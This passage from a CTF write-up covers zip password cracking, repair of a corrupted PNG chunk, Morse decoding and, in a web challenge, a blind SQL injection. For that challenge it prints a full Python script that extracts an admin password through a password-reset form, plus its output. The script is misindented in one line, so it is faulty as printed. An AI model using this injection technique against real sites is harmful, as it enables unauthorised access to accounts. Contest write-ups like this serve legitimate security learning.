1g 0:00:00:00 DONE (2019-07-23 15:26) 2.777g/s 11377p/s 11377c/s 11377C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We get the password as 'violin' (4th last line) almost instantly. Once we extract the contents with 7zip, we get the following files.
```shell
» ls
'a lengthy issue.png'  'Ice Cube - Check Yo Self Remix (Clean).mp3'   README.txt   song_of_my_people.zip
```

I renamed the files to 'file.png', then 'music.mp3'. This is the output of the README.txt file.
```
one of the three files is a red herring, but a helpful one at that.

does any of this ADD up? This is a LONG problem.
```

I ran exiftool against the png file and got this.
```shell
» exiftool file.png 
ExifTool Version Number         : 11.56
File Name                       : file.png
Directory                       : .
File Size                       : 43 kB
File Modification Date/Time     : 2019:07:20 21:22:04-04:00
File Access Date/Time           : 2019:07:23 03:28:10-04:00
File Inode Change Date/Time     : 2019:07:23 03:29:03-04:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1280
Image Height                    : 720
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Adam7 Interlace
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Warning                         : Corrupted PNG image
Image Size                      : 1280x720
Megapixels                      : 0.922
```

We see a Warning message that says this is a Corrupted PNG image.

I will save time now and just say that I went through the mp3 file with both Sonic Visualiser and Audacity, and found nothing from there. I just assumed the mp3 file was the red herring and continued with the PNG file at this stage.

Running pngcheck on the image.
```shell
» pngcheck -vf file.png 
File: file.png (44525 bytes)
  chunk IHDR at offset 0x0000c, length 13
    1280 x 720 image, 8-bit palette, interlaced
  chunk sRGB at offset 0x00025, length 1
    rendering intent = perceptual
  chunk gAMA at offset 0x00032, length 4: 0.45455
  chunk PLTE at offset 0x00042, length 1212501072:  invalid number of entries (4.04167e+08)
: 0 palette entries
:  EOF while reading data
ERRORS DETECTED in file.png
```

Okay so it says the PLTE chunk has an invalid number of entries. I used the [wikipedia page](https://en.wikipedia.org/wiki/Portable_Network_Graphics) as a reference to see what was actually wrong with the PNG file. It tells us that a PNG file must have four **critical** chunks (one of which it can have multiples of), and as many optional **ancillary** chunks as it needs. The four critical chunks are as follows:

* **IHDR** must be the first chunk; it contains (in this order) the image's width (4 bytes), height (4 bytes), bit depth (1 byte), color type (1 byte), compression method (1 byte), filter method (1 byte), and interlace method (1 byte) (13 data bytes total).
* **PLTE** contains the palette; list of colors.
* **IDAT** contains the image, which may be split among multiple IDAT chunks. Such splitting increases filesize slightly, but makes it possible to generate a PNG in a streaming manner. The IDAT chunk contains the actual image data, which is the output stream of the compression algorithm.
* **IEND** marks the image end.

We also know that a chunk layout is as follows.

![](/images/peactf/chunk_layout.png)


Knowing this, I used ghex to view the hexdump of the png file to see if it matches the specification.

![](/images/peactf/hexdump-1.png){:width="1200px"}

As you can see in the section highlighted above, the four bytes before the PLTE section (which should be the length of the PLTE section in hex) is 0x48454c50, which is "HELP" in ascii. This length is very obviously too large from what we can see as the PLTE chunk's length.

We can see the very next chunk after the PLTE chunk is the tRNS chunk. We know the following.

* The four bytes before the tRNS chunk will be the length of the tRNS chunk
* The four bytes before the above four bytes will be the CRC for the PLTE chunk

Therefore, I counted up until just before the PLTE chunk's CRC manually by hand. and found the size of the chunk to be 453 bytes, which is 0x1c5 in hex. I then edited the bytes just before the PLTE chunk to be equal to 0x000001c5. The change is shown below in the four bytes just before the highlighted byte.

![](/images/peactf/hexdump-2.png){:width="1200px"}

I also wrote a script that will fix all critical chunk sizes it finds. The script can be found at [this link](https://github.com/farazsth98/ctf-png-chunksize-fixer/blob/master/png-chunksize-fixer.py) on my github.

Once that was done, the image could be opened.

![](/images/peactf/uncorrupted.png){:width="800px"}

At this point, I couldn't be bothered typing out all of that hex out by hand and then decoding it. I just tried to see if I could solve the challenge without using the hex somehow (Spoiler alert, I did).

Going to the soundcloud link gives us an mp3 file which has a bunch of beeps of varying lengths. Very obvious morse code. I used [this website](https://morsecode.scphillips.com/labs/audio-decoder-adaptive/) to decode it and got the following text.
```
SUP YALL ITS YA BOI LIL ICE CUBE MELTING OUT HERE IN THE HAWAII HEAT FOR ALL OF YOU. YOU GUESSED IT THIS IS LIVE AUDIO FROM MY WORLD TOUR. I REPEAT LIL ICE CUBES WORLD TOUR MAYBE A LIBRARY WILL HELP
```

The soundcloud link also has the following in the description.
```
this concert is part of a larger tour that is archived completely in some kind of hexagonal library. The archive is named between "maybe" and a "repeat". Should be on the 371st page.

I would give you an mp3 of this audio, but I don't know how to navigate those sketchy websites.
```

So from the above image, we know the flag format, and we are also given the page number from the soundcloud page. At this point, when it talked about the hexagonal library, I knew it was talking about the Library of Babel, so I started going through the library and did not get anywhere. I re-read the challenge description and decided to just bruteforce the flag.
```
{1_thousand_spaces_371}
{2_thousand_spaces_371}
{3_thousand_spaces_371}
```

And I got lucky, because I got the flag on the third try.

Flag: `{3_thousand_spaces_371}`

# Philips and Over
<a href="{{ page.url }}#title">Back to top ↑</a>

* **Category:** Web Exploitation
* **Points:** 900

### Challenge

> There is a website running at [http://shell1.2019.peactf.com:61940](http://shell1.2019.peactf.com:61940). Try to log in the "admin" account. 
>
>Hints: A bucket can only fill with the volume of water the shortest plank allows.

### Solution

I first started by looking through the website. I tried SQL injection in the login form, in the forgot-your-password form, and just general source code viewing. I stumbled upon the following in the forgot password form. There's a hidden 'debug' input form.

![](/images/peactf/forgot-password-debug.png){:width="550px"}

I removed `type="hidden"`, then set debug to 1, used 'admin' as the username and 'asd' as the answer and got the following.

![](/images/peactf/sql-query-discover.png){:width="550px"}

I first made sure it was actually SQL injectable.

![](/images/peactf/sql-error.png){:width="550px"}

We see that the query is definitely injectable, however trying to inject it does not give us any output.

![](/images/peactf/no-output.png){:width="550px"}

I then checked to see if it was a blind SQLi by doing the following.

![](/images/peactf/blind-sqli.png){:width="550px"}

Since 1 does not equal 2, the right side of the query ends up being false so the entire query returns false, causing the server to tell us that the User does not exist. Otherwise, it would tell us that it has sent an email to notify the admin about this. So we have a blind SQLi. Question is, how do we exploit it?

There are two types of blind SQLi attacks that can be employed to get the password here. The first would be to use a time-based attack, and the second one would be a regexp-based attack. I used the regexp-based attack. For more information about how a regexp-based blind SQLi works, and a more in-depth explanation of the script below, please see my tutorial [here](/guides/2019/07/28/regex-based-blind-sql-injection-attacks.html).
```python
#!/usr/bin/env python3

import requests
import sys

# Helper function to easily see the query
def blind(query):
    url = "http://shell1.2019.peactf.com:61940/result.php"
    response = requests.post(url, data={"username":"admin' " +query+ " -- .","answer":"asd","debug":"1"})

    return response

keyspace = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$^&*()-=+'

query_left_side = "AND 1=(SELECT 1 FROM users WHERE password LIKE '"

password = ""

num_of_queries = num_of_true_queries = 0

while True:
  num_of_queries += 1
    for k in keyspace:
        query = query_left_side + k + "%')" 
        response = blind(query)
        sys.stdout.write('\rPassword: '+password+k)
        if "Your answer to the security" in response.text:
            num_of_true_queries += 1
            query_left_side += k
            password += k
            break
    if num_of_queries != num_of_true_queries:
        break

print()
print("Password found!: " + password)
```

The script will do exactly as explained above. It tries all the letters in the keyspace, and each time it gets a "Your answer to the security" in the response body, it will concatenate the character with the actual password as well as with the query, so we can continue onwards with the next character.

I ran it and got the password after a couple of minutes.
```shell
» ./sqli.py
Password: 70725064+
Password found!: 70725064
```

Now we just login and we get the flag.

![](/images/peactf/flag.png){:width="550px"}

Flag: `flag{peactf_E_>_A_119d352c970e04cedb8450d036094227}`
